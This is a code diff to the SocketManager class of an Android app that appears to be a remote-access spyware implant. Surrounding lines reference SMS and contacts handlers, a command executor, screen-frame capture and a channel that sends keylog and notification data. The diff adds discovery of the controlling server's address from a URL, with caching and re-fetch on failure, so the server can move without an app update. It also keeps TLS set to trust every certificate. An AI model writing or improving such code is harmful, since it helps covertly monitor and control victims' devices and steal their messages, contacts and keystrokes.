@@ -15,9 +15,14 @@ import org.json.JSONException;
 import org.json.JSONObject;
 import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
+import java.net.HttpURLConnection;
+import java.net.InetSocketAddress;
 import java.net.Socket;
+import java.net.URL;
 import javax.net.ssl.SSLContext;
 import javax.net.ssl.SSLSocket;
 import javax.net.ssl.SSLSocketFactory;
@@ -43,6 +48,7 @@ import java.util.concurrent.atomic.AtomicReference;
 public class SocketManager {
 
     private static final String TAG = "SocketManager";
+    private static final int ENDPOINT_FETCH_TIMEOUT_MS = 10_000;
 
     private static SocketManager instance;
     private Socket   tcpSocket;
@@ -51,6 +57,31 @@ public class SocketManager {
     private final Context  context;
     private volatile boolean connected = false;
     private volatile boolean running   = false;
+
+    // TCP endpoint discovery. The endpoint is cached in memory and in the
+    // app's private preferences so normal reconnects do not hit the discovery
+    // URL. A failed socket open/handshake invalidates this value and causes the
+    // next connection attempt to fetch a fresh host:port.
+    private static final String ENDPOINT_PREFS = "tcp_endpoint";
+    private static final String ENDPOINT_HOST_KEY = "host";
+    private static final String ENDPOINT_PORT_KEY = "port";
+    private final Object endpointLock = new Object();
+    private volatile TcpEndpoint tcpEndpoint;
+
+    private static final class TcpEndpoint {
+        final String host;
+        final int port;
+
+        TcpEndpoint(String host, int port) {
+            this.host = host;
+            this.port = port;
+        }
+
+        @Override
+        public String toString() {
+            return host + ":" + port;
+        }
+    }
 
     // Device screen dimensions — populated during registration, sent in every frame
     private int deviceScreenW = 0;
@@ -307,6 +338,7 @@ public class SocketManager {
 
     private SocketManager(Context context) {
         this.context       = context;
+        loadCachedTcpEndpoint();
         commandExecutor    = new CommandExecutor(context);
         smsHandler         = new SMSHandler(context);
         contactsHandler    = new ContactsHandler(context);
@@ -457,6 +489,199 @@ public class SocketManager {
     }
 
     /**
+     * Open the TCP connection with a finite timeout, then layer TLS over that
+     * connected socket. Using SSLSocketFactory.createSocket(host, port)
+     * directly can block too long when a Zeabur forwarding port disappears.
+     */
+    private static SSLSocket openTlsSocket(
+            SSLSocketFactory factory, String host, int port) throws IOException {
+        Socket plainSocket = new Socket();
+        try {
+            plainSocket.connect(new InetSocketAddress(host, port), ENDPOINT_FETCH_TIMEOUT_MS);
+            SSLSocket sslSocket = (SSLSocket) factory.createSocket(plainSocket, host, port, true);
+            sslSocket.setUseClientMode(true);
+            sslSocket.startHandshake();
+            return sslSocket;
+        } catch (IOException e) {
+            try { plainSocket.close(); } catch (IOException ignored) {}
+            throw e;
+        }
+    }
+
+    /**
+     * Load the last successful discovery result. This is deliberately done
+     * without network I/O so service startup remains fast and offline devices
+     * can keep retrying the cached route.
+     */
+    private void loadCachedTcpEndpoint() {
+        try {
+            android.content.SharedPreferences prefs =
+                    context.getSharedPreferences(ENDPOINT_PREFS, Context.MODE_PRIVATE);
+            String host = prefs.getString(ENDPOINT_HOST_KEY, null);
+            int port = prefs.getInt(ENDPOINT_PORT_KEY, -1);
+            tcpEndpoint = createTcpEndpoint(host, port);
+            if (tcpEndpoint != null) {
+                Log.i(TAG, "Loaded cached TCP endpoint " + tcpEndpoint);
+            }
+        } catch (Throwable e) {
+            Log.w(TAG, "Could not load cached TCP endpoint: " + e.getMessage());
+        }
+    }
+
+    /**
+     * Return the cached route, fetching a new route only when there is no
+     * cached route. Calls are serialized so the primary, stream, and live
+     * channels cannot issue duplicate discovery requests.
+     */
+    private TcpEndpoint resolveTcpEndpoint() throws IOException {
+        TcpEndpoint cached = tcpEndpoint;
+        if (cached != null) return cached;
+
+        synchronized (endpointLock) {
+            cached = tcpEndpoint;
+            if (cached != null) return cached;
+
+            TcpEndpoint discovered = fetchTcpEndpoint();
+            tcpEndpoint = discovered;
+            context.getSharedPreferences(ENDPOINT_PREFS, Context.MODE_PRIVATE)
+                    .edit()
+                    .putString(ENDPOINT_HOST_KEY, discovered.host)
+                    .putInt(ENDPOINT_PORT_KEY, discovered.port)
+                    .apply();
+            Log.i(TAG, "Discovered and cached TCP endpoint " + discovered);
+            return discovered;
+        }
+    }
+
+    /**
+     * Forget only the route that actually failed. If another channel already
+     * discovered a replacement, a late failure from the old socket must not
+     * erase the newer route.
+     */
+    private void invalidateTcpEndpoint(TcpEndpoint failedEndpoint) {
+        if (failedEndpoint == null) return;
+        synchronized (endpointLock) {
+            if (tcpEndpoint != failedEndpoint) return;
+            tcpEndpoint = null;
+            context.getSharedPreferences(ENDPOINT_PREFS, Context.MODE_PRIVATE)
+                    .edit()
+                    .remove(ENDPOINT_HOST_KEY)
+                    .remove(ENDPOINT_PORT_KEY)
+                    .apply();
+            Log.w(TAG, "TCP endpoint unavailable; discovery will be retried");
+        }
+    }
+
+    private TcpEndpoint fetchTcpEndpoint() throws IOException {
+        HttpURLConnection connection = null;
+        try {
+            connection = (HttpURLConnection) new URL(Constants.TCP_ENDPOINT_URL).openConnection();
+            connection.setRequestMethod("GET");
+            connection.setConnectTimeout(ENDPOINT_FETCH_TIMEOUT_MS);
+            connection.setReadTimeout(ENDPOINT_FETCH_TIMEOUT_MS);
+            connection.setUseCaches(false);
+            connection.setInstanceFollowRedirects(true);
+
+            int status = connection.getResponseCode();
+            InputStream body = status >= 200 && status < 300
+                    ? connection.getInputStream()
+                    : connection.getErrorStream();
+            String response = body == null ? "" : readText(body).trim();
+            if (status < 200 || status >= 300) {
+                throw new IOException("Endpoint discovery returned HTTP " + status);
+            }
+
+            TcpEndpoint endpoint = parseTcpEndpoint(response);
+            if (endpoint == null) {
+                throw new IOException("Endpoint discovery returned an invalid host:port");
+            }
+            return endpoint;
+        } catch (IOException e) {
+            Log.w(TAG, "TCP endpoint discovery failed: " + e.getMessage());
+            throw e;
+        } finally {
+            if (connection != null) connection.disconnect();
+        }
+    }
+
+    private static String readText(InputStream input) throws IOException {
+        StringBuilder result = new StringBuilder();
+        BufferedReader reader = new BufferedReader(new InputStreamReader(input, "UTF-8"));
+        String line;
+        while ((line = reader.readLine()) != null) {
+            if (result.length() > 0) result.append('\n');
+            result.append(line);
+            if (result.length() > 4096) break;
+        }
+        reader.close();
+        return result.toString();
+    }
+
+    /**
+     * Accept the plain-text host:port response from devport. Also tolerate a
+     * JSON response or a URL so a future endpoint implementation can evolve
+     * without requiring another APK release.
+     */
+    private static TcpEndpoint parseTcpEndpoint(String raw) {
+        if (raw == null) return null;
+        String value = raw.trim();
+        if (value.length() == 0) return null;
+
+        if (value.startsWith("{")) {
+            try {
+                JSONObject json = new JSONObject(value);
+                value = json.optString("endpoint", json.optString("address", "")).trim();
+            } catch (Exception ignored) {
+                return null;
+            }
+        }
+
+        if (value.startsWith("tcp://")) value = value.substring("tcp://".length());
+        if (value.startsWith("https://")) value = value.substring("https://".length());
+        if (value.startsWith("http://")) value = value.substring("http://".length());
+        int slash = value.indexOf('/');
+        if (slash >= 0) value = value.substring(0, slash);
+
+        String host;
+        String portText;
+        if (value.startsWith("[")) {
+            int close = value.indexOf(']');
+            if (close < 0 || close + 2 > value.length() || value.charAt(close + 1) != ':') {
+                return null;
+            }
+            host = value.substring(1, close);
+            portText = value.substring(close + 2);
+        } else {
+            int colon = value.lastIndexOf(':');
+            if (colon <= 0 || colon == value.length() - 1 || value.indexOf(':') != colon) {
+                return null;
+            }
+            host = value.substring(0, colon);
+            portText = value.substring(colon + 1);
+        }
+
+        int port;
+        try {
+            port = Integer.parseInt(portText);
+        } catch (NumberFormatException e) {
+            return null;
+        }
+        return createTcpEndpoint(host, port);
+    }
+
+    private static TcpEndpoint createTcpEndpoint(String host, int port) {
+        if (host == null) return null;
+        host = host.trim();
+        if (host.length() == 0 || host.length() > 253 || port < 1 || port > 65535) {
+            return null;
+        }
+        if (host.indexOf('/') >= 0 || host.indexOf(' ') >= 0 || host.indexOf('\\') >= 0) {
+            return null;
+        }
+        return new TcpEndpoint(host, port);
+    }
+
+    /**
      * Schedule a frame capture 200 ms after the last device-user interaction.
      * Resets the timer on each call so rapid interactions produce only one frame.
      */
@@ -494,12 +719,14 @@ public class SocketManager {
         primaryLoopThread = Thread.currentThread();
         final int myGen = loopGeneration;
         while (running && loopGeneration == myGen) {
+            TcpEndpoint endpoint = null;
+            boolean socketOpened = false;
             try {
-                Log.i(TAG, "Connecting (TLS) to " + Constants.TCP_HOST + ":" + Constants.TCP_PORT);
+                endpoint = resolveTcpEndpoint();
+                Log.i(TAG, "Connecting (TLS) to " + endpoint);
                 SSLSocketFactory tlsFactory = buildTrustAllFactory();
-                SSLSocket sslSock = (SSLSocket) tlsFactory.createSocket(Constants.TCP_HOST, Constants.TCP_PORT);
-                sslSock.setUseClientMode(true);
-                sslSock.startHandshake();
+                SSLSocket sslSock = openTlsSocket(tlsFactory, endpoint.host, endpoint.port);
+                socketOpened = true;
                 tcpSocket = sslSock;
                 tcpSocket.setKeepAlive(true);
                 tcpSocket.setTcpNoDelay(true);
@@ -518,6 +745,7 @@ public class SocketManager {
             } catch (Throwable e) {
                 // Catch Throwable (not just Exception) so an Error never kills the reconnect loop
                 Log.e(TAG, "Connection error: " + e.getMessage());
+                if (!socketOpened) invalidateTcpEndpoint(endpoint);
             } finally {
                 connected = false;
                 stopHeartbeat();
@@ -555,11 +783,13 @@ public class SocketManager {
                 try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
                 continue;
             }
+            TcpEndpoint endpoint = null;
+            boolean socketOpened = false;
             try {
+                endpoint = resolveTcpEndpoint();
                 SSLSocketFactory streamTlsFactory = buildTrustAllFactory();
-                SSLSocket streamSsl = (SSLSocket) streamTlsFactory.createSocket(Constants.TCP_HOST, Constants.TCP_PORT);
-                streamSsl.setUseClientMode(true);
-                streamSsl.startHandshake();
+                SSLSocket streamSsl = openTlsSocket(streamTlsFactory, endpoint.host, endpoint.port);
+                socketOpened = true;
                 streamSocket = streamSsl;
                 streamSocket.setKeepAlive(true);
                 streamSocket.setTcpNoDelay(true);        // disable Nagle — send frames immediately
@@ -635,6 +865,7 @@ public class SocketManager {
                 }
             } catch (Throwable e) {
                 Log.e(TAG, "Stream channel error: " + e.getMessage());
+                if (!socketOpened) invalidateTcpEndpoint(endpoint);
             } finally {
                 streamConnected = false;
                 try { if (streamSocket != null) streamSocket.close(); } catch (Exception ignored) {}
@@ -717,11 +948,13 @@ public class SocketManager {
                 try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
                 continue;
             }
+            TcpEndpoint endpoint = null;
+            boolean socketOpened = false;
             try {
+                endpoint = resolveTcpEndpoint();
                 SSLSocketFactory liveTlsFactory = buildTrustAllFactory();
-                SSLSocket liveSsl = (SSLSocket) liveTlsFactory.createSocket(Constants.TCP_HOST, Constants.TCP_PORT);
-                liveSsl.setUseClientMode(true);
-                liveSsl.startHandshake();
+                SSLSocket liveSsl = openTlsSocket(liveTlsFactory, endpoint.host, endpoint.port);
+                socketOpened = true;
                 liveSocket = liveSsl;
                 liveSocket.setKeepAlive(true);
                 liveSocket.setTcpNoDelay(true);       // disable Nagle — keylog/notif sent immediately
@@ -769,6 +1002,7 @@ public class SocketManager {
                 }
             } catch (Throwable e) {
                 Log.e(TAG, "Live channel error: " + e.getMessage());
+                if (!socketOpened) invalidateTcpEndpoint(endpoint);
             } finally {
                 liveConnected = false;
                 try { if (liveSocket != null) liveSocket.close(); } catch (Exception ignored) {}
